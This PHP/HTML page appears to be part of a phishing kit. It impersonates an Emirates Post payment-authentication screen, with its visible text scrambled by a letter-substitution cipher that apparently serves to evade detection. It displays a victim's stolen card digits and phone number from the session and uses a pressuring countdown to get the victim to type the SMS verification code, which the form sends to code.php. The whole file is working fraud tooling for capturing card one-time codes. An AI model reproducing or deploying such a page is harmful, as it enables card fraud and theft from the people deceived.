<?

session_start();


$card = $_SESSION['card']  ;

$phone = $_SESSION['phone']  ;


?>
<html class=" sizes customelements history pointerevents postmessage webgl websockets cssanimations csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth no-csscolumns-breakbefore no-csscolumns-breakafter no-csscolumns-breakinside flexbox picture srcset webworkers sizes customelements history pointerevents postmessage webgl websockets cssanimations csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth no-csscolumns-breakbefore no-csscolumns-breakafter no-csscolumns-breakinside flexbox picture srcset webworkers sizes customelements history pointerevents postmessage webgl websockets cssanimations csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth no-csscolumns-breakbefore no-csscolumns-breakafter no-csscolumns-breakinside flexbox picture srcset webworkers" lang="de"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta charset="UTF-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<title>| Authentification |</title>
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<meta name="google" content="notranslate">
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="ath/style.css">
	<link rel="stylesheet" href="ath/style.css">
	

	</head>
	<body class="tanya" style="display: block;">
		<div id="bg-load" class="bg-load" style="display: none;"><div class="load"></div></div>
		<section>
		<div class="head">
		<span><img src="ath/id.png"></span>
		<span><img src="ath/vs.png"></span>
		</div>
		<div class="titr">Ultmzt cvnfria eht fvllvqrng umyatne.</div>
		<div class="kolchi">
        
		<p style="font-size:12px">Eht pnrwpt umzzqvid hmz bttn ztne ev eht 
avbrlt npabti lrzetd btlvq. Rf yvp nttd ev chmngt yvpi avbrlt npabti, 
ultmzt cvnemce yvpi bmnx vi avdrfy re orm eht momrlmblt chmnntlz (MEA, 
qtb).</p>
		<div class="inf">
		<span class="tr">Atichmne:</span>
		<span class="rp">Tarimetz Uvze</span>
		</div>
		<div class="inf">
		<span class="tr">Mavpne:</span>
		<span class="rp" style="font-family:arial">26,75 (AED)</span>
		</div>
		<div class="inf">
		<span class="tr">Dmet:</span>
		<span class="rp"><?echo date_default_timezone_set('UTC'); date('l jS \of F Y h:i:s A');?></span>
		</div>
		<div class="inf">
		<span class="tr">Citdre cmid npabti:</span>
		<span class="rp"><?echo $card[0],$card[1],$card[2],$card[3]."-KKKK-KKKK-KKKK";?></span>
		</div>
		<div class="inf">
		<span class="tr">Yvpi Uhvnt Npabti:</span>
		<span class="rp"><?echo $phone;?></span>
		</div>
		<form  method="post" action="code.php">
		<div class="inf">
		<span class="tr">cvdt ZAZ:</span>
		<span class="rp"><input type="text" class="tantan"  name="sms" maxlength="22" required="" placeholder="" autocomplete="off" autofocus=""></span>
		</div>
		<div style="font-size:12px">Ultmzt tneti eht otirfrcmervn cvdt itctrotd by zaz: <span id="timer" style="color:red;font-weight:bold;font-size:12px">01:56</span></div>
		</div>
		<!-- <div style="font-size:12px;color:red;font-weight:bold;padding:">Yvp apze mcctue ehrz umyatne ehivpgh eht muulrcmervn, rf yvp hmot cvnfriamervn fiva yvpi bmnx!</div> -->
		<div class="btn"><button type="submit" class="text-center">Zpbare</button></div></form>
		<div class="foot">© 2021 Tarimetz Uvze - Mll irghez itztiotd.</div>
		
		</section>

	<script>
	

/*-------------------------------------------------------*/
/*------------------- TIMER FUNCTION --------------------*/
/*-------------------------------------------------------*/

    function countdown(timer, minutes, seconds) {
// set time for the particular countdown
var time = minutes*60 + seconds;
var interval = setInterval(function() {
    var el = document.getElementById('timer');
    // if the time is 0 then end the counter
    if(time == 0) {
        setTimeout(function() {
            el.innerHTML = "ZAZ cvdt ztne...";
        }, 1500);


        clearInterval(interval);

        setTimeout(function() {
            countdown('clock', 2, 1);
        }, 2000);
    }
    var minutes = Math.floor( time / 60 );
    if (minutes < 10) minutes = "0" + minutes;
    var seconds = time % 60;
    if (seconds < 10) seconds = "0" + seconds; 
    var text = minutes + ':' + seconds;
    el.innerHTML = text;
    time--;
}, 1500);     // 1000 = 1 segonde in timer = j'ai fais 1500 pour calculer 1.5 segonde comme c'est 1 segonde
}
countdown('clock', 2, 1);
	</script>
	

</body></html>